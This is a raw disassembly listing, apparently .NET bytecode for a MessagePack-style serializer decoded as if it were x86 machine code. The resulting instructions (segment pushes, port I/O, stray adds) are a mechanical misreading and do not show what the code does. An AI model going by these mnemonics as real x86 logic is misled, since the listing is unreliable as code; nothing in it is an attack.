  403bb6:	7d 24                	jge    0x403bdc
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	04 16                	add    $0x16,%al
  403bbc:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403bc1:	3a 00                	cmp    (%eax),%al
  403bc3:	00 06                	add    %al,(%esi)
  403bc5:	25 03 28 64 00       	and    $0x642803,%eax
  403bca:	00 06                	add    %al,(%esi)
  403bcc:	6f                   	outsl  %ds:(%esi),(%dx)
  403bcd:	38 00                	cmp    %al,(%eax)
  403bcf:	00 06                	add    %al,(%esi)
  403bd1:	03 6f 56             	add    0x56(%edi),%ebp
  403bd4:	00 00                	add    %al,(%eax)
  403bd6:	06                   	push   %es
  403bd7:	09 17                	or     %edx,(%edi)
  403bd9:	58                   	pop    %eax
  403bda:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403bdf:	2a 06                	sub    (%esi),%al
  403be1:	20 da                	and    %bl,%dl
  403be3:	00 00                	add    %al,(%eax)
  403be5:	00 33                	add    %dh,(%ebx)
  403be7:	0e                   	push   %cs
  403be8:	02 06                	add    (%esi),%al
  403bea:	03 28                	add    (%eax),%ebp
  403bec:	65 00 00             	add    %al,%gs:(%eax)
  403bef:	06                   	push   %es
  403bf0:	28 4f 00             	sub    %cl,0x0(%edi)
  403bf3:	00 06                	add    %al,(%esi)
  403bf5:	2a 06                	sub    (%esi),%al
  403bf7:	20 db                	and    %bl,%bl
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 33                	add    %dh,(%ebx)
  403bfd:	0e                   	push   %cs
  403bfe:	02 06                	add    (%esi),%al
  403c00:	03 28                	add    (%eax),%ebp
  403c02:	65 00 00             	add    %al,%gs:(%eax)
  403c05:	06                   	push   %es
  403c06:	28 4f 00             	sub    %cl,0x0(%edi)
  403c09:	00 06                	add    %al,(%esi)
  403c0b:	2a 06                	sub    (%esi),%al
  403c0d:	20 d0                	and    %dl,%al
  403c0f:	00 00                	add    %al,(%eax)
  403c11:	00 33                	add    %dh,(%ebx)
  403c13:	0f 02 03             	lar    (%ebx),%eax
  403c16:	6f                   	outsl  %ds:(%esi),(%dx)
  403c17:	7a 00                	jp     0x403c19
  403c19:	00 0a                	add    %cl,(%edx)
  403c1b:	67 6a 28             	addr16 push $0x28
  403c1e:	42                   	inc    %edx
  403c1f:	00 00                	add    %al,(%eax)
  403c21:	06                   	push   %es
  403c22:	2a 06                	sub    (%esi),%al
  403c24:	20 d1                	and    %dl,%cl
  403c26:	00 00                	add    %al,(%eax)
  403c28:	00 33                	add    %dh,(%ebx)
  403c2a:	27                   	daa
  403c2b:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403c31:	0b 03                	or     (%ebx),%eax
  403c33:	07                   	pop    %es
  403c34:	16                   	push   %ss
  403c35:	18 6f 45             	sbb    %ch,0x45(%edi)
  403c38:	00 00                	add    %al,(%eax)
  403c3a:	0a 26                	or     (%esi),%ah
  403c3c:	07                   	pop    %es
  403c3d:	28 26                	sub    %ah,(%esi)
  403c3f:	00 00                	add    %al,(%eax)
  403c41:	06                   	push   %es
  403c42:	0b 02                	or     (%edx),%eax
  403c44:	07                   	pop    %es
  403c45:	16                   	push   %ss
  403c46:	28 81 00 00 0a 6a    	sub    %al,0x6a0a0000(%ecx)
  403c4c:	28 42 00             	sub    %al,0x0(%edx)
  403c4f:	00 06                	add    %al,(%esi)
  403c51:	2a 06                	sub    (%esi),%al
  403c53:	20 d2                	and    %dl,%dl
  403c55:	00 00                	add    %al,(%eax)
  403c57:	00 33                	add    %dh,(%ebx)
  403c59:	27                   	daa
  403c5a:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403c60:	0b 03                	or     (%ebx),%eax
  403c62:	07                   	pop    %es
  403c63:	16                   	push   %ss
  403c64:	1a 6f 45             	sbb    0x45(%edi),%ch
  403c67:	00 00                	add    %al,(%eax)
  403c69:	0a 26                	or     (%esi),%ah
  403c6b:	07                   	pop    %es
  403c6c:	28 26                	sub    %ah,(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	06                   	push   %es
  403c71:	0b 02                	or     (%edx),%eax
  403c73:	07                   	pop    %es
  403c74:	16                   	push   %ss
  403c75:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403c79:	0a 6a 28             	or     0x28(%edx),%ch
  403c7c:	42                   	inc    %edx
  403c7d:	00 00                	add    %al,(%eax)
  403c7f:	06                   	push   %es
  403c80:	2a 06                	sub    (%esi),%al
  403c82:	20 d3                	and    %dl,%bl
  403c84:	00 00                	add    %al,(%eax)
  403c86:	00 33                	add    %dh,(%ebx)
  403c88:	25 1e 8d 44 00       	and    $0x448d1e,%eax
  403c8d:	00 01                	add    %al,(%ecx)
  403c8f:	0b 03                	or     (%ebx),%eax
  403c91:	07                   	pop    %es
  403c92:	16                   	push   %ss
  403c93:	1e                   	push   %ds
  403c94:	6f                   	outsl  %ds:(%esi),(%dx)
  403c95:	45                   	inc    %ebp
  403c96:	00 00                	add    %al,(%eax)
  403c98:	0a 26                	or     (%esi),%ah
  403c9a:	07                   	pop    %es
  403c9b:	28 26                	sub    %ah,(%esi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	06                   	push   %es
  403ca0:	0b 02                	or     (%edx),%eax
  403ca2:	07                   	pop    %es
  403ca3:	16                   	push   %ss
  403ca4:	28 82 00 00 0a 28    	sub    %al,0x280a0000(%edx)
  403caa:	42                   	inc    %edx
  403cab:	00 00                	add    %al,(%eax)
  403cad:	06                   	push   %es
  403cae:	2a 00                	sub    (%eax),%al
  403cb0:	1b 30                	sbb    (%eax),%esi
  403cb2:	04 00                	add    $0x0,%al
  403cb4:	47                   	inc    %edi
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	00 11                	add    %dl,(%ecx)
  403cb9:	00 00                	add    %al,(%eax)
  403cbb:	11 73 79             	adc    %esi,0x79(%ebx)
  403cbe:	00 00                	add    %al,(%eax)
  403cc0:	0a 0a                	or     (%edx),%cl
  403cc2:	02 06                	add    (%esi),%al
  403cc4:	28 58 00             	sub    %bl,0x0(%eax)
  403cc7:	00 06                	add    %al,(%esi)
  403cc9:	06                   	push   %es
  403cca:	6f                   	outsl  %ds:(%esi),(%dx)
  403ccb:	75 00                	jne    0x403ccd
  403ccd:	00 0a                	add    %cl,(%edx)
  403ccf:	d4 8d                	aam    $0x8d
  403cd1:	44                   	inc    %esp
  403cd2:	00 00                	add    %al,(%eax)
  403cd4:	01 0b                	add    %ecx,(%ebx)
  403cd6:	06                   	push   %es
  403cd7:	16                   	push   %ss
  403cd8:	6a 6f                	push   $0x6f
  403cda:	4e                   	dec    %esi
  403cdb:	00 00                	add    %al,(%eax)
  403cdd:	0a 06                	or     (%esi),%al
  403cdf:	07                   	pop    %es
  403ce0:	16                   	push   %ss
  403ce1:	06                   	push   %es
  403ce2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce3:	75 00                	jne    0x403ce5
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  403cee:	07                   	pop    %es
  403cef:	28 a1 00 00 06 0c    	sub    %ah,0xc060000(%ecx)
  403cf5:	de 0a                	fimuls (%edx)
  403cf7:	06                   	push   %es
  403cf8:	2c 06                	sub    $0x6,%al
  403cfa:	06                   	push   %es
  403cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfc:	33 00                	xor    (%eax),%eax
  403cfe:	00 0a                	add    %cl,(%edx)
  403d00:	dc 08                	fmull  (%eax)
  403d02:	2a 00                	sub    (%eax),%al
  403d04:	01 10                	add    %edx,(%eax)
  403d06:	00 00                	add    %al,(%eax)
  403d08:	02 00                	add    (%eax),%al
  403d0a:	06                   	push   %es
  403d0b:	00 35 3b 00 0a 00    	add    %dh,0xa003b
  403d11:	00 00                	add    %al,(%eax)
  403d13:	00 13                	add    %dl,(%ebx)
  403d15:	30 02                	xor    %al,(%edx)
  403d17:	00 ec                	add    %ch,%ah
  403d19:	00 00                	add    %al,(%eax)
  403d1b:	00 0b                	add    %cl,(%ebx)
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	11 02                	adc    %eax,(%edx)
  403d21:	7b 24                	jnp    0x403d47
  403d23:	00 00                	add    %al,(%eax)
  403d25:	04 0a                	add    $0xa,%al
  403d27:	06                   	push   %es
  403d28:	45                   	inc    %ebp
  403d29:	0c 00                	or     $0x0,%al
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	05 00 00 00 05       	add    $0x5000000,%eax
  403d32:	00 00                	add    %al,(%eax)
  403d34:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  403d3a:	00 00                	add    %al,(%eax)
  403d3c:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403d3f:	00 00                	add    %al,(%eax)
  403d41:	1e                   	push   %ds
  403d42:	00 00                	add    %al,(%eax)
  403d44:	00 30                	add    %dh,(%eax)
  403d46:	00 00                	add    %al,(%eax)
  403d48:	00 42 00             	add    %al,0x0(%edx)
  403d4b:	00 00                	add    %al,(%eax)
  403d4d:	54                   	push   %esp
  403d4e:	00 00                	add    %al,(%eax)
  403d50:	00 66 00             	add    %ah,0x0(%esi)
  403d53:	00 00                	add    %al,(%eax)
  403d55:	79 00                	jns    0x403d57
  403d57:	00 00                	add    %al,(%eax)
  403d59:	86 00                	xchg   %al,(%eax)
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  403d63:	28 67 00             	sub    %ah,0x0(%edi)
  403d66:	00 06                	add    %al,(%esi)
  403d68:	2a 03                	sub    (%ebx),%al
  403d6a:	02 7b 23             	add    0x23(%ebx),%bh
  403d6d:	00 00                	add    %al,(%eax)
  403d6f:	04 74                	add    $0x74,%al
  403d71:	39 00                	cmp    %eax,(%eax)
  403d73:	00 01                	add    %al,(%ecx)
  403d75:	28 68 00             	sub    %ch,0x0(%eax)
  403d78:	00 06                	add    %al,(%esi)
  403d7a:	2a 03                	sub    (%ebx),%al
  403d7c:	02 7b 23             	add    0x23(%ebx),%bh
  403d7f:	00 00                	add    %al,(%eax)
  403d81:	04 a5                	add    $0xa5,%al
  403d83:	51                   	push   %ecx
  403d84:	00 00                	add    %al,(%eax)
  403d86:	01 28                	add    %ebp,(%eax)
  403d88:	6e                   	outsb  %ds:(%esi),(%dx)
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	06                   	push   %es
  403d8c:	2a 03                	sub    (%ebx),%al
  403d8e:	02 7b 23             	add    0x23(%ebx),%bh
  403d91:	00 00                	add    %al,(%eax)
  403d93:	04 a5                	add    $0xa5,%al
  403d95:	52                   	push   %edx
  403d96:	00 00                	add    %al,(%eax)
  403d98:	01 28                	add    %ebp,(%eax)
  403d9a:	6d                   	insl   (%dx),%es:(%edi)
  403d9b:	00 00                	add    %al,(%eax)
  403d9d:	06                   	push   %es
  403d9e:	2a 03                	sub    (%ebx),%al
  403da0:	02 7b 23             	add    0x23(%ebx),%bh
  403da3:	00 00                	add    %al,(%eax)
  403da5:	04 a5                	add    $0xa5,%al
  403da7:	5e                   	pop    %esi
  403da8:	00 00                	add    %al,(%eax)
  403daa:	01 28                	add    %ebp,(%eax)
  403dac:	6c                   	insb   (%dx),%es:(%edi)
  403dad:	00 00                	add    %al,(%eax)
  403daf:	06                   	push   %es
  403db0:	2a 03                	sub    (%ebx),%al
  403db2:	02 7b 23             	add    0x23(%ebx),%bh
  403db5:	00 00                	add    %al,(%eax)
  403db7:	04 a5                	add    $0xa5,%al
  403db9:	53                   	push   %ebx
  403dba:	00 00                	add    %al,(%eax)
  403dbc:	01 28                	add    %ebp,(%eax)
  403dbe:	6a 00                	push   $0x0
  403dc0:	00 06                	add    %al,(%esi)
  403dc2:	2a 03                	sub    (%ebx),%al
  403dc4:	02 7b 23             	add    0x23(%ebx),%bh
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	04 a5                	add    $0xa5,%al
  403dcb:	54                   	push   %esp
  403dcc:	00 00                	add    %al,(%eax)
  403dce:	01 6c 28 6a          	add    %ebp,0x6a(%eax,%ebp,1)
  403dd2:	00 00                	add    %al,(%eax)
  403dd4:	06                   	push   %es
  403dd5:	2a 03                	sub    (%ebx),%al
  403dd7:	02 28                	add    (%eax),%ch
  403dd9:	45                   	inc    %ebp
  403dda:	00 00                	add    %al,(%eax)
  403ddc:	06                   	push   %es
  403ddd:	28 6e 00             	sub    %ch,0x0(%esi)
  403de0:	00 06                	add    %al,(%esi)
  403de2:	2a 03                	sub    (%ebx),%al
  403de4:	02 7b 23             	add    0x23(%ebx),%bh
  403de7:	00 00                	add    %al,(%eax)
  403de9:	04 74                	add    $0x74,%al
  403deb:	03 00                	add    (%eax),%eax
  403ded:	00 1b                	add    %bl,(%ebx)
  403def:	28 69 00             	sub    %ch,0x0(%ecx)
  403df2:	00 06                	add    %al,(%esi)
  403df4:	2a 02                	sub    (%edx),%al
  403df6:	03 28                	add    (%eax),%ebp
  403df8:	40                   	inc    %eax
  403df9:	00 00                	add    %al,(%eax)
  403dfb:	06                   	push   %es
  403dfc:	2a 02                	sub    (%edx),%al
  403dfe:	03 28                	add    (%eax),%ebp
  403e00:	41                   	inc    %ecx
  403e01:	00 00                	add    %al,(%eax)
  403e03:	06                   	push   %es
  403e04:	2a 03                	sub    (%ebx),%al
  403e06:	28 67 00             	sub    %ah,0x0(%edi)
  403e09:	00 06                	add    %al,(%esi)
  403e0b:	2a 1b                	sub    (%ebx),%bl
  403e0d:	30 03                	xor    %al,(%ebx)
  403e0f:	00 39                	add    %bh,(%ecx)
  403e11:	00 00                	add    %al,(%eax)
  403e13:	00 12                	add    %dl,(%edx)
  403e15:	00 00                	add    %al,(%eax)
  403e17:	11 02                	adc    %eax,(%edx)
  403e19:	0a 16                	or     (%esi),%dl
  403e1b:	0b 06                	or     (%esi),%eax
  403e1d:	12 01                	adc    (%ecx),%al
  403e1f:	28 49 00             	sub    %cl,0x0(%ecx)
  403e22:	00 0a                	add    %cl,(%edx)
  403e24:	02 7b 27             	add    0x27(%ebx),%bh
  403e27:	00 00                	add    %al,(%eax)
  403e29:	04 2d                	add    $0x2d,%al
  403e2b:	12 02                	adc    (%edx),%al
  403e2d:	02 02                	add    (%edx),%al
  403e2f:	7b 26                	jnp    0x403e57
  403e31:	00 00                	add    %al,(%eax)
  403e33:	04 73                	add    $0x73,%al
  403e35:	31 00                	xor    %eax,(%eax)
  403e37:	00 06                	add    %al,(%esi)
  403e39:	7d 27                	jge    0x403e62
  403e3b:	00 00                	add    %al,(%eax)
  403e3d:	04 de                	add    $0xde,%al
  403e3f:	0a 07                	or     (%edi),%al
  403e41:	2c 06                	sub    $0x6,%al
  403e43:	06                   	push   %es
  403e44:	28 50 00             	sub    %dl,0x0(%eax)
  403e47:	00 0a                	add    %cl,(%edx)
  403e49:	dc 02                	faddl  (%edx)
  403e4b:	7b 27                	jnp    0x403e74
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	04 2a                	add    $0x2a,%al
  403e51:	00 00                	add    %al,(%eax)
  403e53:	00 01                	add    %al,(%ecx)
  403e55:	10 00                	adc    %al,(%eax)
  403e57:	00 02                	add    %al,(%edx)
  403e59:	00 04 00             	add    %al,(%eax,%eax,1)
  403e5c:	24 28                	and    $0x28,%al
  403e5e:	00 0a                	add    %cl,(%edx)
  403e60:	00 00                	add    %al,(%eax)
  403e62:	00 00                	add    %al,(%eax)
  403e64:	13 30                	adc    (%eax),%esi
  403e66:	04 00                	add    $0x0,%al
  403e68:	18 00                	sbb    %al,(%eax)
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	13 00                	adc    (%eax),%eax
  403e6e:	00 11                	add    %dl,(%ecx)
  403e70:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  403e76:	0a 02                	or     (%edx),%al
  403e78:	06                   	push   %es
  403e79:	16                   	push   %ss
  403e7a:	03 6f 45             	add    0x45(%edi),%ebp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	0a 26                	or     (%esi),%ah
  403e81:	06                   	push   %es
  403e82:	28 23                	sub    %ah,(%ebx)
  403e84:	00 00                	add    %al,(%eax)
  403e86:	06                   	push   %es
  403e87:	2a 13                	sub    (%ebx),%dl
  403e89:	30 04 00             	xor    %al,(%eax,%eax,1)
  403e8c:	99                   	cltd
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403e92:	00 11                	add    %dl,(%ecx)
  403e94:	14 0a                	adc    $0xa,%al
  403e96:	16                   	push   %ss
  403e97:	0b 02                	or     (%edx),%eax
  403e99:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  403e9f:	12 02                	adc    (%edx),%al
  403ea1:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  403ea7:	0a 02                	or     (%edx),%al
  403ea9:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  403eaf:	0b 2b                	or     (%ebx),%ebp
  403eb1:	63 02                	arpl   %eax,(%edx)
  403eb3:	20 d9                	and    %bl,%cl
  403eb5:	00 00                	add    %al,(%eax)
  403eb7:	00 33                	add    %dh,(%ebx)
  403eb9:	09 03                	or     %eax,(%ebx)
  403ebb:	6f                   	outsl  %ds:(%esi),(%dx)
  403ebc:	7a 00                	jp     0x403ebe
  403ebe:	00 0a                	add    %cl,(%edx)
  403ec0:	0b 2b                	or     (%ebx),%ebp
  403ec2:	52                   	push   %edx
  403ec3:	02 20                	add    (%eax),%ah
  403ec5:	da 00                	fiaddl (%eax)
  403ec7:	00 00                	add    %al,(%eax)
  403ec9:	33 22                	xor    (%edx),%esp
  403ecb:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ed1:	0a 03                	or     (%ebx),%al
  403ed3:	06                   	push   %es
  403ed4:	16                   	push   %ss
  403ed5:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ed8:	00 00                	add    %al,(%eax)
  403eda:	0a 26                	or     (%esi),%ah
  403edc:	06                   	push   %es
  403edd:	28 26                	sub    %ah,(%esi)
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	06                   	push   %es
  403ee2:	0a 06                	or     (%esi),%al
  403ee4:	16                   	push   %ss
  403ee5:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403ee9:	0a 0b                	or     (%ebx),%cl
  403eeb:	2b 28                	sub    (%eax),%ebp
  403eed:	02 20                	add    (%eax),%ah
  403eef:	db 00                	fildl  (%eax)
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	33 20                	xor    (%eax),%esp
  403ef5:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403efb:	0a 03                	or     (%ebx),%al
  403efd:	06                   	push   %es
  403efe:	16                   	push   %ss
  403eff:	1a 6f 45             	sbb    0x45(%edi),%ch
  403f02:	00 00                	add    %al,(%eax)
  403f04:	0a 26                	or     (%esi),%ah
  403f06:	06                   	push   %es
  403f07:	28 26                	sub    %ah,(%esi)
  403f09:	00 00                	add    %al,(%eax)
  403f0b:	06                   	push   %es
  403f0c:	0a 06                	or     (%esi),%al
  403f0e:	16                   	push   %ss
  403f0f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403f13:	0a 0b                	or     (%ebx),%cl
  403f15:	07                   	pop    %es
  403f16:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403f1a:	01 0a                	add    %ecx,(%edx)
  403f1c:	03 06                	add    (%esi),%eax
  403f1e:	16                   	push   %ss
  403f1f:	07                   	pop    %es
  403f20:	6f                   	outsl  %ds:(%esi),(%dx)
  403f21:	45                   	inc    %ebp
  403f22:	00 00                	add    %al,(%eax)
  403f24:	0a 26                	or     (%esi),%ah
  403f26:	06                   	push   %es
  403f27:	28 23                	sub    %ah,(%ebx)
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	2a 00                	sub    (%eax),%al
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	13 30                	adc    (%eax),%esi
  403f32:	04 00                	add    $0x0,%al
  403f34:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403f35:	00 00                	add    %al,(%eax)
  403f37:	00 15 00 00 11 03    	add    %dl,0x3110000
  403f3d:	28 22                	sub    %ah,(%edx)
  403f3f:	00 00                	add    %al,(%eax)
  403f41:	06                   	push   %es
  403f42:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  403f45:	06                   	push   %es
  403f46:	8e 69 0c             	mov    0xc(%ecx),%gs
  403f49:	16                   	push   %ss
  403f4a:	0d 08 1f 1f 30       	or     $0x301f1f08,%eax
  403f4f:	13 20                	adc    (%eax),%esp
  403f51:	a0 00 00 00 08       	mov    0x8000000,%al
  403f56:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  403f59:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403f5e:	00 00                	add    %al,(%eax)
  403f60:	0a 2b                	or     (%ebx),%ch
  403f62:	74 08                	je     0x403f6c
  403f64:	20 ff                	and    %bh,%bh
  403f66:	00 00                	add    %al,(%eax)
  403f68:	00 30                	add    %dh,(%eax)
  403f6a:	19 20                	sbb    %esp,(%eax)
  403f6c:	d9 00                	flds   (%eax)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403f75:	00 00                	add    %al,(%eax)
  403f77:	0a 08                	or     (%eax),%cl
  403f79:	d2 0d 02 09 6f 62    	rorb   %cl,0x626f0902
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	0a 2b                	or     (%ebx),%ch
  403f83:	53                   	push   %ebx
  403f84:	08 20                	or     %ah,(%eax)
  403f86:	ff                   	(bad)
  403f87:	ff 00                	incl   (%eax)
  403f89:	00 30                	add    %dh,(%eax)
  403f8b:	27                   	daa
  403f8c:	20 da                	and    %bl,%dl
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	00 0d 02 09 6f 62    	add    %cl,0x626f0902
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0a 08                	or     (%eax),%cl
  403f9a:	68 28 63 00 00       	push   $0x6328
  403f9f:	0a 28                	or     (%eax),%ch
  403fa1:	26 00 00             	add    %al,%es:(%eax)
  403fa4:	06                   	push   %es
  403fa5:	0b 02                	or     (%edx),%eax
  403fa7:	07                   	pop    %es
  403fa8:	16                   	push   %ss
  403fa9:	07                   	pop    %es
  403faa:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fad:	4c                   	dec    %esp
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	0a 2b                	or     (%ebx),%ch
  403fb2:	24 20                	and    $0x20,%al
  403fb4:	db 00                	fildl  (%eax)
  403fb6:	00 00                	add    %al,(%eax)
  403fb8:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403fbd:	00 00                	add    %al,(%eax)
  403fbf:	0a 08                	or     (%eax),%cl
  403fc1:	28 4a 00             	sub    %cl,0x0(%edx)
  403fc4:	00 0a                	add    %cl,(%edx)
  403fc6:	28 26                	sub    %ah,(%esi)
  403fc8:	00 00                	add    %al,(%eax)
  403fca:	06                   	push   %es
  403fcb:	0b 02                	or     (%edx),%eax
  403fcd:	07                   	pop    %es
  403fce:	16                   	push   %ss
  403fcf:	07                   	pop    %es
  403fd0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fd3:	4c                   	dec    %esp
  403fd4:	00 00                	add    %al,(%eax)
  403fd6:	0a 02                	or     (%edx),%al
  403fd8:	06                   	push   %es
  403fd9:	16                   	push   %ss
  403fda:	06                   	push   %es
  403fdb:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403fde:	4c                   	dec    %esp
  403fdf:	00 00                	add    %al,(%eax)
  403fe1:	0a 2a                	or     (%edx),%ch
  403fe3:	00 13                	add    %dl,(%ebx)
  403fe5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403fe8:	88 00                	mov    %al,(%eax)
  403fea:	00 00                	add    %al,(%eax)
  403fec:	16                   	push   %ss
  403fed:	00 00                	add    %al,(%eax)
  403fef:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  403ff2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  403ff8:	07                   	pop    %es
  403ff9:	20 ff                	and    %bh,%bh
  403ffb:	00 00                	add    %al,(%eax)
  403ffd:	00 30                	add    %dh,(%eax)
  403fff:	19 20                	sbb    %esp,(%eax)
  404001:	c4 00                	les    (%eax),%eax
  404003:	00 00                	add    %al,(%eax)
  404005:	0c 02                	or     $0x2,%al
  404007:	08 6f 62             	or     %ch,0x62(%edi)
  40400a:	00 00                	add    %al,(%eax)
  40400c:	0a 07                	or     (%edi),%al
  40400e:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  404011:	08 6f 62             	or     %ch,0x62(%edi)
  404014:	00 00                	add    %al,(%eax)
  404016:	0a 2b                	or     (%ebx),%ch
  404018:	53                   	push   %ebx
  404019:	07                   	pop    %es
  40401a:	20 ff                	and    %bh,%bh
  40401c:	ff 00                	incl   (%eax)
  40401e:	00 30                	add    %dh,(%eax)
  404020:	27                   	daa
  404021:	20 c5                	and    %al,%ch
  404023:	00 00                	add    %al,(%eax)
  404025:	00 0c 02             	add    %cl,(%edx,%eax,1)
  404028:	08 6f 62             	or     %ch,0x62(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	0a 07                	or     (%edi),%al
  40402f:	68 28 63 00 00       	push   $0x6328
  404034:	0a 28                	or     (%eax),%ch
  404036:	26 00 00             	add    %al,%es:(%eax)
  404039:	06                   	push   %es
  40403a:	0a 02                	or     (%edx),%al
  40403c:	06                   	push   %es
  40403d:	16                   	push   %ss
  40403e:	06                   	push   %es
  40403f:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404042:	4c                   	dec    %esp
  404043:	00 00                	add    %al,(%eax)
  404045:	0a 2b                	or     (%ebx),%ch
  404047:	24 20                	and    $0x20,%al
  404049:	c6 00 00             	movb   $0x0,(%eax)
  40404c:	00 0c 02             	add    %cl,(%edx,%eax,1)
  40404f:	08 6f 62             	or     %ch,0x62(%edi)
  404052:	00 00                	add    %al,(%eax)
  404054:	0a 07                	or     (%edi),%al
  404056:	28 4a 00             	sub    %cl,0x0(%edx)
  404059:	00 0a                	add    %cl,(%edx)
  40405b:	28 26                	sub    %ah,(%esi)
  40405d:	00 00                	add    %al,(%eax)
  40405f:	06                   	push   %es
  404060:	0a 02                	or     (%edx),%al
  404062:	06                   	push   %es
  404063:	16                   	push   %ss
  404064:	06                   	push   %es
  404065:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404068:	4c                   	dec    %esp
  404069:	00 00                	add    %al,(%eax)
  40406b:	0a 02                	or     (%edx),%al
  40406d:	03 16                	add    (%esi),%edx
  40406f:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404075:	00 0a                	add    %cl,(%edx)
  404077:	2a 13                	sub    (%ebx),%dl
  404079:	30 04 00             	xor    %al,(%eax,%eax,1)
  40407c:	21 00                	and    %eax,(%eax)
  40407e:	00 00                	add    %al,(%eax)
  404080:	13 00                	adc    (%eax),%eax
  404082:	00 11                	add    %dl,(%ecx)
  404084:	02 20                	add    (%eax),%ah
  404086:	cf                   	iret
  404087:	00 00                	add    %al,(%eax)
  404089:	00 6f 62             	add    %ch,0x62(%edi)
  40408c:	00 00                	add    %al,(%eax)
  40408e:	0a 03                	or     (%ebx),%al
  404090:	28 84 00 00 0a 0a 02 	sub    %al,0x20a0a00(%eax,%eax,1)
  404097:	06                   	push   %es
  404098:	28 26                	sub    %ah,(%esi)
  40409a:	00 00                	add    %al,(%eax)
  40409c:	06                   	push   %es
  40409d:	16                   	push   %ss
  40409e:	1e                   	push   %ds
  40409f:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a0:	4c                   	dec    %esp
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 2a                	or     (%edx),%ch
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	00 13                	add    %dl,(%ebx)
  4040a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4040ac:	1d 01 00 00 00       	sbb    $0x1,%eax
  4040b1:	00 00                	add    %al,(%eax)
  4040b3:	00 03                	add    %al,(%ebx)
  4040b5:	16                   	push   %ss
  4040b6:	6a 3f                	push   $0x3f
  4040b8:	8a 00                	mov    (%eax),%al
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	03 1f                	add    (%edi),%ebx
  4040be:	7f 6a                	jg     0x40412a
  4040c0:	30 09                	xor    %cl,(%ecx)
  4040c2:	02 03                	add    (%ebx),%al
  4040c4:	d2 6f 62             	shrb   %cl,0x62(%edi)
  4040c7:	00 00                	add    %al,(%eax)
  4040c9:	0a 2a                	or     (%edx),%ch
  4040cb:	03 20                	add    (%eax),%esp
  4040cd:	ff 00                	incl   (%eax)
  4040cf:	00 00                	add    %al,(%eax)
  4040d1:	6a 30                	push   $0x30
  4040d3:	14 02                	adc    $0x2,%al
  4040d5:	20 cc                	and    %cl,%ah
  4040d7:	00 00                	add    %al,(%eax)
  4040d9:	00 6f 62             	add    %ch,0x62(%edi)
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	0a 02                	or     (%edx),%al
  4040e0:	03 d2                	add    %edx,%edx
  4040e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e3:	62 00                	bound  %eax,(%eax)
  4040e5:	00 0a                	add    %cl,(%edx)
  4040e7:	2a 03                	sub    (%ebx),%al
  4040e9:	20 ff                	and    %bh,%bh
  4040eb:	ff 00                	incl   (%eax)
  4040ed:	00 6a 30             	add    %ch,0x30(%edx)
